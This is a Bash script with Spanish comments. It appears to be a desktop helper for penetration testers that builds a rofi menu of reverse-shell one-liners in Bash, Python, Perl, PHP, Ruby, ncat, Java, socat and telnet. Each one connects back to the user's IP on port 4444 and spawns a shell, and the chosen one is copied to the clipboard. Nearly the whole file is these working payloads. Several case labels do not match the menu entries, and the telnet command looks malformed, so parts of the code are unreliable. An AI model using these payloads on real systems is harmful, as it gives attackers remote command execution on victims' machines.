#!/bin/bash

# Dirección IP fija (puedes cambiarla según tus necesidades)
ip=$(/home/eltrompazo/.config/polybar/moduloSpoty/ip.sh)

# Definir los iconos
bash_icon=""
python_icon=" "
perl_icon=""
php_icon=""
ruby_icon=""
ncat_icon=""
java_icon=""
socat_icon=""
telnet_icon=""




# Comandos con IP fija
bash_command="bash -i >& /dev/tcp/$ip/4444 0>&1"
python_command="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
perl_command="perl -e 'use Socket;\$i=\"$ip\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
php_command="php -r '\$sock=fsockopen(\"$ip\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
ruby_command="ruby -rsocket -e'f=TCPSocket.open(\"$ip\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
ncat_command="ncat $ip 4444 -e /bin/bash"
java_command="r = Runtime.getRuntime();p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/$ip/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor();"
socat_command="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:4444"
telnet_command="rm -f /tmp/p; mknod /tmp/p p && telnet $ip 4444 0/tmp/p"

# Menú desplegable con Rofi
selected_option=$(echo -e " Bash\n Python\n Perl\n PHP\n Ruby\n Ncat\n Java\n Socat\n Telnet" | rofi -dmenu -p "Selecciona una opción:" -config /home/eltrompazo/.config/rofi/themes/simple-tokyonight.rasi)

# Copiar el comando según la opción seleccionada
case "$selected_option" in
    "bash")
        echo "$bash_command" | xclip -selection clipboard
        ;;
    "Python")
        echo "$python_command" | xclip -selection clipboard
        ;;
    "Perl")
        echo "$perl_command" | xclip -selection clipboard
        ;;
    "PHP")
        echo "$php_command" | xclip -selection clipboard
        ;;
    "Ruby")
        echo "$ruby_command" | xclip -selection clipboard
        ;;
    "ncat")
        echo "$ncat_command" | xclip -selection clipboard
        ;;
    "Java")
        echo "$java_command" | xclip -selection clipboard
        ;;
    "socat")
        echo "$socat_command" | xclip -selection clipboard
        ;;
    "telnet")
        echo "$telnet_command" | xclip -selection clipboard
        ;;
    *)
        ;;
esac

